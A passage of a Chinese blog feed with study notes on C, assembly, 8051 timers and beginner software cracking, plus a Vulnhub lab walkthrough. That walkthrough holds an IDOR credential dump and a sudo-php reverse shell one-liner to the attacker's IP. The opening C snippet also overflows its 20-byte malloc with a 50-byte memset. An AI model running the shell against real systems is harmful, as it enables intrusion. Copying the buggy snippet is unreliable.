(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">20</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));<span class="comment">//使用malloc分配内存，50个char类型的大小</span></span><br><span class="line"><span class="built_in">memset</span>(szstr, <span class="number">0</span>, <span class="number">50</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));  <span class="comment">//初始化为0</span></span><br><span class="line"><span class="built_in">free</span>(szstr);  <span class="comment">//释放内存</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言基础06–存储类-amp-内存管理&quot;&gt;&lt;a href=&quot;#C语言基础06–存储类-amp-内存管理&quot; class=&quot;headerlink&quot; title=&quot;C语言基础06–存储类&amp;amp;内存管理&quot;&gt;&lt;/a&gt;C语言基础06–存储类&amp;amp;内存管理&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C语言学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>汇编基础13--间接寻址</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8013--%E9%97%B4%E6%8E%A5%E5%AF%BB%E5%9D%80/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8013--%E9%97%B4%E6%8E%A5%E5%AF%BB%E5%9D%80/</id>
    <published>2020-05-26T02:27:19.000Z</published>
    <updated>2020-05-26T01:05:57.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="汇编基础13–间接寻址"><a href="#汇编基础13–间接寻址" class="headerlink" title="汇编基础13–间接寻址"></a>汇编基础13–间接寻址</h1><p>可以把寄存器当做指针来进行寻址操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">arrnum word 1,2,3,4,5,6,7</span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">xor eax ,eax</span><br><span class="line">xor ebx ,ebx</span><br><span class="line">mov eax ,offset arrnum</span><br><span class="line">mov bl ,[eax]</span><br><span class="line">add eax ,2</span><br><span class="line">mov bl ,[eax]</span><br><span class="line">add eax ,2</span><br><span class="line">mov bl ,[eax]</span><br><span class="line">add eax ,2</span><br><span class="line">invoke ExitProcess,0</span><br><span class="line">main endp</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><p>也可以这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">arrnum word 1,2,3,4,5,6,7</span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">xor eax ,eax</span><br><span class="line">xor ebx ,ebx</span><br><span class="line">mov eax ,offset arrnum</span><br><span class="line">mov bl ,[eax]</span><br><span class="line">mov bl ,[eax+2]</span><br><span class="line">mov bl ,[eax+4]</span><br><span class="line">invoke ExitProcess,0</span><br><span class="line">main endp</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><h3 id="比例因子"><a href="#比例因子" class="headerlink" title="比例因子"></a>比例因子</h3><p>利用数组下标进行寻址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">arrnum dword 1,2,3,4,5,6,7</span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">mov esi ,4</span><br><span class="line">mov eax ,arrnum[esi * 4]</span><br><span class="line">invoke ExitProcess,0</span><br><span class="line">main endp</span><br><span class="line">END main</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;汇编基础13–间接寻址&quot;&gt;&lt;a href=&quot;#汇编基础13–间接寻址&quot; class=&quot;headerlink&quot; title=&quot;汇编基础13–间接寻址&quot;&gt;&lt;/a&gt;汇编基础13–间接寻址&lt;/h1&gt;&lt;p&gt;可以把寄存器当做指针来进行寻址操作&lt;/p&gt;
&lt;figure clas
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="汇编基础学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>51单片机入门04--定时&amp;计数器</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A804--%E5%AE%9A%E6%97%B6&amp;%E8%AE%A1%E6%95%B0%E5%99%A8/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A804--%E5%AE%9A%E6%97%B6&amp;%E8%AE%A1%E6%95%B0%E5%99%A8/</id>
    <published>2020-05-20T12:57:19.000Z</published>
    <updated>2020-05-21T04:53:29.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="51单片机入门04–定时-amp-计数器"><a href="#51单片机入门04–定时-amp-计数器" class="headerlink" title="51单片机入门04–定时&amp;计数器"></a>51单片机入门04–定时&amp;计数器</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="image-20200520204754535.png" alt="image-20200520204754535"></p><p>常用的工作方式是1（16位）和2（8位自动重置，用于串口通信产生波特率）</p><p>一般用的是工作方式1</p><p><img src="image-20200520205107854.png" alt="image-20200520205107854"></p><p>GATE一般给0，如果通过外部中断来启用定时计数器，可以给1</p><p><img src="image-20200520205329831.png" alt="image-20200520205329831"></p><h4 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h4><p><img src="image-20200520205738730.png" alt="image-20200520205738730"></p><p>单片机定时器单位是us，1ms=1000us</p><blockquote><p>11.0592MHz用于通讯</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;51单片机入门04–定时-amp-计数器&quot;&gt;&lt;a href=&quot;#51单片机入门04–定时-amp-计数器&quot; class=&quot;headerlink&quot; title=&quot;51单片机入门04–定时&amp;amp;计数器&quot;&gt;&lt;/a&gt;51单片机入门04–定时&amp;amp;计数器&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="51单片机学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>【Vulnhub】Me And My Girlfriend--Workthourgh</title>
    <link href="http://kn0sky.com/wiki/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/5-MeAndMyGirlfriend/"/>
    <id>http://kn0sky.com/wiki/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/5-MeAndMyGirlfriend/</id>
    <published>2020-05-20T08:06:19.000Z</published>
    <updated>2020-05-20T12:09:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="【Vulnhub】Me-And-My-Girlfriend-1–Workthourgh"><a href="#【Vulnhub】Me-And-My-Girlfriend-1–Workthourgh" class="headerlink" title="【Vulnhub】Me And My Girlfriend:1–Workthourgh"></a>【Vulnhub】Me And My Girlfriend:1–Workthourgh</h2><blockquote><p>文章作者：kn0sky</p><p>作者博客：kn0sky.com</p></blockquote><p>本来想下载新的靶机去玩的，无奈下载速度太慢，无意间发现去年下载的没打过的靶机，是个简单难度的，刚好挺久没练习了，有点生疏了拿来练练手，耗时：2小时</p><h3 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Date release: 13 Dec 2019</span><br><span class="line">Author: TW1C3</span><br><span class="line">Series: Me and My Girlfriend</span><br><span class="line"></span><br><span class="line">Description: This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, &quot;Ceban Corp&quot;, something has changed from Alice&#39;s attitude towards Bob like something is &quot;hidden&quot;, And Bob asks for your help to get what Alice is hiding and get full access to the company!</span><br><span class="line"></span><br><span class="line">Difficulty Level: Beginner</span><br><span class="line"></span><br><span class="line">Notes: there are 2 flag files</span><br><span class="line"></span><br><span class="line">Learning: Web Application | Simple Privilege Escalation</span><br></pre></td></tr></table></figure><p>靶机下载地址：<a href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/" target="_blank" rel="external nofollow noopener noreferrer">https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/</a></p><h3 id="用到的知识-amp-工具"><a href="#用到的知识-amp-工具" class="headerlink" title="用到的知识&amp;工具"></a>用到的知识&amp;工具</h3><ul><li>nmap&amp;主机发现、端口扫描</li><li>burp&amp;修改请求包信息</li><li>sudo -l查看权限</li><li>php反弹shell</li></ul><h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>攻击机的IP地址为192.168.101.5</p><p>靶机的IP地址为192.168.101.4</p><p>先端口扫描</p><p><img src="image-20200520163545755.png" alt="image-20200520163545755"></p><p>目标开放了22端口和80端口</p><p>查看80端口</p><p><img src="image-20200520164618303.png" alt="image-20200520164618303"></p><p>看起来像个提示，等会再说，先进行目录爆破看看，得到几个可以访问的地址</p><p><img src="image-20200520164704590.png" alt="image-20200520164704590"></p><p>在robots.txt文件里找到如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: *</span><br><span class="line">Allow: &#x2F;heyhoo.txt</span><br></pre></td></tr></table></figure><p>访问这个地址：</p><p><img src="image-20200520164822736.png" alt="image-20200520164822736"></p><p>看起来又是个提示</p><p>这个网站主页上说，网站只能从内部访问，这里猜测服务器通过IP地址来判断访问者来源，那么我们在访问请求中添加XFF头来试一试：<code>X-Forwarded-For:127.0.0.1</code></p><p><img src="image-20200520175517452.png" alt="image-20200520175517452"></p><p>网站成功跳转了（这里注意，每次发送请求都需要把XFF头加上）,成功进入网站主页：</p><p><img src="image-20200520175705133.png" alt="image-20200520175705133"></p><p>浏览一番发现，网站存在用户名密码泄露的问题，这里我们通过注册功能注册一个账号，然后登录进入，进入profile页面如下：</p><p><img src="image-20200520175929238.png" alt="image-20200520175929238"></p><p>在这个页面刷新，用Burp抓包，把抓到的包放到repeater模块中</p><p><img src="image-20200520180051559.png" alt="image-20200520180051559"></p><p>可以轻易发现，我们的账号密码在网页中是以明文保存的，这个时候我们修改请求中的user_id参数，可以发现，不同的user_id的值代表不同的用户信息（账号&amp;密码）</p><p>通过不断修改user_id的值我们可以得到如下用户名和密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eweuhtandingan:skuyatuh</span><br><span class="line">aingmaung:qwerty!!!</span><br><span class="line">sundatea:indONEsia</span><br><span class="line">sedihaingmah:cedihhihihi</span><br><span class="line">alice:4lic3</span><br></pre></td></tr></table></figure><p>拿到了目标Alice的账号密码，ssh登录服务器看看：</p><p><img src="image-20200520180431376.png" alt="image-20200520180431376"></p><p>登陆成功，且在<code>alice</code>的主目录下找到了<code>flag1</code></p><p>以及emmmm，alice不喜欢bob了？？？算了，管他呢</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alice@gfriEND:~/.my_secret$ cat my_notes.txt </span><br><span class="line">Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, hopefully Bob doesn't know my notes</span><br></pre></td></tr></table></figure><p>下一步是拿到root权限，先查看一下Alice账号的权限吧：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alice@gfriEND:~/.my_secret$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> alice on gfriEND:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User alice may run the following commands on gfriEND:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/php</span><br></pre></td></tr></table></figure><p>alice可以免密码使用root权限执行php命令，这就好办了，思路是通过root权限执行php反弹shell到攻击机上</p><p>先在攻击机上运行nc来监听</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@windows7:~<span class="comment"># nc -nvlp 7788</span></span><br><span class="line">listening on [any] 7788 ...</span><br></pre></td></tr></table></figure><p>然后使用alice 的账号运行php反弹shell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alice@gfriEND:~/.my_secret$ sudo php -r <span class="string">'$sock=fsockopen("192.168.101.5",7788);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><p>这个时候我们拿到了反弹的shell:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@windows7:~<span class="comment"># nc -nvlp 7788</span></span><br><span class="line">listening on [any] 7788 ...</span><br><span class="line">connect to [192.168.101.5] from (UNKNOWN) [192.168.101.4] 43264</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>既然已经提权到root了，直接去root目录找flag</p><p><img src="image-20200520182436014.png" alt="image-20200520182436014"></p><p>到此正式结束</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;【Vulnhub】Me-And-My-Girlfriend-1–Workthourgh&quot;&gt;&lt;a href=&quot;#【Vulnhub】Me-And-My-Girlfriend-1–Workthourgh&quot; class=&quot;headerlink&quot; title=&quot;【Vulnh
      
    
    </summary>
    
    
      <category term="靶机笔记" scheme="http://kn0sky.com/categories/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/"/>
    
      <category term="vulnhub" scheme="http://kn0sky.com/categories/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/"/>
    
    
  </entry>
  
  <entry>
    <title>逆向基础02--初试破解</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%8002--%E5%88%9D%E8%AF%95%E7%A0%B4%E8%A7%A3/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%8002--%E5%88%9D%E8%AF%95%E7%A0%B4%E8%A7%A3/</id>
    <published>2020-05-16T17:40:50.000Z</published>
    <updated>2020-05-17T10:13:47.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向基础02–初试破解"><a href="#逆向基础02–初试破解" class="headerlink" title="逆向基础02–初试破解"></a>逆向基础02–初试破解</h1><p>三个例子初试破解学习记录（样本均来自知识星球课件）</p><h3 id="例一：控制台破解例子"><a href="#例一：控制台破解例子" class="headerlink" title="例一：控制台破解例子"></a>例一：控制台破解例子</h3><p>目标是：登录成功！</p><h4 id="0x01-先找到程序入口"><a href="#0x01-先找到程序入口" class="headerlink" title="0x01 先找到程序入口"></a>0x01 先找到程序入口</h4><p>通过查找参考文本字符串可以轻松找到入口位置：</p><p><img src="image-20200517013016227.png" alt="image-20200517013016227"></p><h4 id="0x02-分析程序"><a href="#0x02-分析程序" class="headerlink" title="0x02 分析程序"></a>0x02 分析程序</h4><p>通过阅读反汇编代码，我们可知程序会首先让我们输入一次密码，然后把输入的密码一位一位和正确答案比对正确一位，如果全都相同也就是eax大于5，则登录成功</p><p>思路：</p><ol><li>直接跳转到登录成功的地方</li><li>修改eax大于5</li><li>修改待比对的数值，然后输入修改过的密码</li><li>通过待比对的数值计算出密码</li></ol><h4 id="0x03-破解程序"><a href="#0x03-破解程序" class="headerlink" title="0x03 破解程序"></a>0x03 破解程序</h4><p>直接按照思路1走最简单</p><p><img src="image-20200517013755039.png" alt="image-20200517013755039"></p><p>完成</p><p><img src="image-20200517013818165.png" alt="image-20200517013818165"></p><h3 id="例二：MFC破解例子"><a href="#例二：MFC破解例子" class="headerlink" title="例二：MFC破解例子"></a>例二：MFC破解例子</h3><p>重点在于学会查找字符串</p><p>这是图形界面的程序</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;逆向基础02–初试破解&quot;&gt;&lt;a href=&quot;#逆向基础02–初试破解&quot; class=&quot;headerlink&quot; title=&quot;逆向基础02–初试破解&quot;&gt;&lt;/a&gt;逆向基础02–初试破解&lt;/h1&gt;&lt;p&gt;三个例子初试破解学习记录（样本均来自知识星球课件）&lt;/p&gt;
&lt;h3 
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="逆向入门学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>逆向基础01--初见逆向</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%8001--%E5%88%9D%E8%A7%81%E9%80%86%E5%90%91/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%8001--%E5%88%9D%E8%A7%81%E9%80%86%E5%90%91/</id>
    <published>2020-05-16T13:40:50.000Z</published>
    <updated>2020-05-16T15:07:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向基础01–初见逆向"><a href="#逆向基础01–初见逆向" class="headerlink" title="逆向基础01–初见逆向"></a>逆向基础01–初见逆向</h1><p>在使用VS2015生成解决方案的时候，有两个版本：</p><p><img src="image-20200516194459881.png" alt="image-20200516194459881"></p><p>分别是Debug和Release版</p><ul><li><p>Debug版比较大，带调试信息</p></li><li><p>Release版更小，会对代码进行优化精简</p></li></ul><h3 id="寻找主程序"><a href="#寻找主程序" class="headerlink" title="寻找主程序"></a>寻找主程序</h3><p>在逆向的时候，第一件事是先找到主程序</p><p>示例程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello world!"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个字符串hello world!在运行的时候回打印出来，所以可以作为标志点去寻找</p><p>对于debug版本：（使用Ollydbg）</p><ul><li>ollydbg拖入程序后，右键，查找，所有参考文本字符串，然后点进去</li></ul><p>对于Release版本：</p><ul><li>ollydbg拖入程序后，右键，查找，所有参考文本字符串，然后点进入</li><li>F8跳转，见到红的F7进去，直到3个push1个call，很有可能是main函数（main函数特点：3个参数）F7进去看</li><li>也可以直接往上拖，一般release版本main函数在最上面附近</li><li>如果有API查找所有模块调用</li><li>也可以用ida，ida会自动分析出main函数</li></ul><h3 id="内存中数据的修改"><a href="#内存中数据的修改" class="headerlink" title="内存中数据的修改"></a>内存中数据的修改</h3><p>比如将前面的代码输出的hello world改为其他内容</p><p>直接修改1：</p><ol><li>找到需要修改的地方，F2加断点，F9执行过去</li><li>在内存窗口上右键，转到，输入地址</li><li>ollydbg在地址上，左键拖动选中，右键，二进制，编辑修改<ul><li>不保持大小可能会淹掉后面的数据</li></ul></li></ol><p>直接修改2：</p><ol><li>在内存空的地方，修改入其他的值</li><li>找到需要修改的地方的push，把push后面的地址改为刚才修改过的地址</li></ol><p>修改的作用：跳过程序中某些过程</p><h3 id="修改跳转"><a href="#修改跳转" class="headerlink" title="修改跳转"></a>修改跳转</h3><p>示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> nNum = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;nNum);</span><br><span class="line"><span class="keyword">if</span> (nNum == <span class="number">87998623</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"success!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"failed!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目的是输出success</p><p>先在ollydbg里找到main函数</p><p><img src="image-20200516212446200.png" alt="image-20200516212446200"></p><p>找到关键跳转，双击，汇编，改成我们要去的地址</p><p><img src="image-20200516215952286.png" alt="image-20200516215952286"></p><p>然后我随便输入个啥，都能输出success啦</p><p><img src="image-20200516224835553.png" alt="image-20200516224835553"></p><blockquote><p>把对比对象的值改掉也行，方法不唯一</p></blockquote><h3 id="滑板指令"><a href="#滑板指令" class="headerlink" title="滑板指令"></a>滑板指令</h3><p>使用nop（没有作用的指令）把跳转改掉</p><p>还是刚才那个程序，修改结果如下：</p><p><img src="image-20200516230516330.png" alt="image-20200516230516330"></p><p>执行完，打印出success！这里就不放图了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;逆向基础01–初见逆向&quot;&gt;&lt;a href=&quot;#逆向基础01–初见逆向&quot; class=&quot;headerlink&quot; title=&quot;逆向基础01–初见逆向&quot;&gt;&lt;/a&gt;逆向基础01–初见逆向&lt;/h1&gt;&lt;p&gt;在使用VS2015生成解决方案的时候，有两个版本：&lt;/p&gt;
&lt;p&gt;&lt;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="逆向入门学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言基础05--字符串操作</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8005--%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8005--%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/</id>
    <published>2020-05-16T07:40:50.000Z</published>
    <updated>2020-05-28T01:50:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言基础05–字符串操作"><a href="#C语言基础05–字符串操作" class="headerlink" title="C语言基础05–字符串操作"></a>C语言基础05–字符串操作</h1><h3 id="字符串的声明"><a href="#字符串的声明" class="headerlink" title="字符串的声明"></a>字符串的声明</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//字符串的声明可以用3钟方法</span></span><br><span class="line"><span class="comment">//在c/c++里，字符串以00结尾，第一种方式声明会自动在字符串末尾加00</span></span><br><span class="line"><span class="keyword">char</span> str[] = &#123; <span class="string">"hello"</span> &#125;;</span><br><span class="line"><span class="comment">//第二种方式声明需要手动添加\0</span></span><br><span class="line"><span class="keyword">char</span> str1[] = &#123; <span class="string">'h'</span>,<span class="string">'e'</span>,<span class="string">'l'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'\0'</span> &#125;;</span><br><span class="line"><span class="comment">//第三种方式声明和声明数组是一样的</span></span><br><span class="line"><span class="keyword">char</span> * str2 = <span class="string">"hello"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s,%s,%s"</span>, str, str1, str2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串的输入"><a href="#字符串的输入" class="headerlink" 